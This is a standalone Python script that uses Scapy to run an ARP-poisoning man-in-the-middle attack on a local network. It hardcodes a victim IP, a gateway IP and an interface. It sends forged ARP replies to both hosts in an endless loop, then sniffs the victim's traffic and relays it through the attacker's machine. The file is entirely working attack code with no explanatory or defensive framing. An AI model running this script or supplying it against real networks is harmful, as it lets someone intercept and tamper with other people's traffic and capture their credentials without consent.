#!/usr/bin/python3
from scapy.all import *
import time
import os
import signal
import sys
import threading

target_ip = '192.168.1.103'
gateway_ip = '192.168.1.1'
my_ip = '192.168.1.105'
interface = 'wlp3s0'
target_mac = ''
gateway_mac = ''
my_mac = ''
def get_mac(ipscan):
    ans,unans = arping(ipscan, iface=interface, verbose=False)
    for s,r in ans:
        return r[Ether].src
    return None

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print('[*] restoring target...')
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwsrc='ff:ff:ff:ff:ff:ff',hwdst=target_mac),count=5, verbose=False, iface=interface)
    send(ARP(op=2,pdst=target_ip,psrc=gateway_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=gateway_mac),count=5, verbose=False, iface=interface)
    os.kill(os.getpid(), 9)
    return

def snf_prn(packet):
    try:
        #packet.show()
        #wrpcap('arper.pcap',packet,append=True,sync=True)
        if packet['Ether'].src == gateway_mac and packet['IP'].dst == target_ip:
            packet['Ether'].src = my_mac
            packet['Ether'].dst = target_mac
            sendp(packet, verbose=False, iface=interface)
        elif packet['Ether'].src == target_mac and packet['IP'].dst != my_ip:
            packet['Ether'].src = my_mac
            packet['Ether'].dst = gateway_mac
            sendp(packet, verbose=False, iface=interface)
    except:
        pass


def sig_handler(signum, frame):
    print('[*] Exiting.....')
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    ptarg = ARP()
    ptarg.op = 2
    ptarg.psrc = gateway_ip
    ptarg.pdst = target_ip
    ptarg.hwdst = target_mac 
    
    pgate = ARP()
    pgate.op = 2
    pgate.psrc = target_ip
    pgate.pdst = gateway_ip
    pgate.hwdst = gateway_mac

    print('[*] Beginning the ARP poison. [CTRL-C to stop]')
    count = 1
    while True:
        try:
            send(ptarg, verbose=False, iface=interface)
            send(pgate, verbose=False, iface=interface)
            time.sleep(1)
        except Exception as e:
            print(e)
        print('[*] ARP poison attack finished %d' % count)
        count += 1
    return
def main():
    global target_mac, gateway_mac, my_mac

    my_mac = get_if_hwaddr(interface)
    if my_mac == None:
        print('[!!!] Failed to get %s MAC.Exiting' % interface)
        sys.exit(0)
    else:
        print('[*] %s MAC is %s' % (interface, my_mac))
    target_mac = get_mac(target_ip)
    if target_mac == None:
        print('[!!!] Failed to get target MAC.Exiting')
        sys.exit(0)
    else:
        print('[*] target MAC is %s' % target_mac)
    
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac == None:
        print('[!!!] Failed to get gateway MAC.Exiting')
        sys.exit(0)
    else:
        print('[*] gateway MAC is %s' % gateway_mac)
    
    poison_thread = threading.Thread(target = poison_target,\
            args = (gateway_ip, gateway_mac,target_ip,target_mac))
    poison_thread.setDaemon(True)
    poison_thread.start()
    
    try:
        signal.signal(signal.SIGINT, sig_handler)
        signal.signal(signal.SIGTERM, sig_handler)
        print('[*] Starting sniffer packets....')
        filt = 'ip host %s' % target_ip
        sniff(store=0,filter=filt, iface=interface, prn=snf_prn)
    except Exception as e:
        print(e)
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

__main__ = '__main__'

if __main__ == '__main__':
    main()

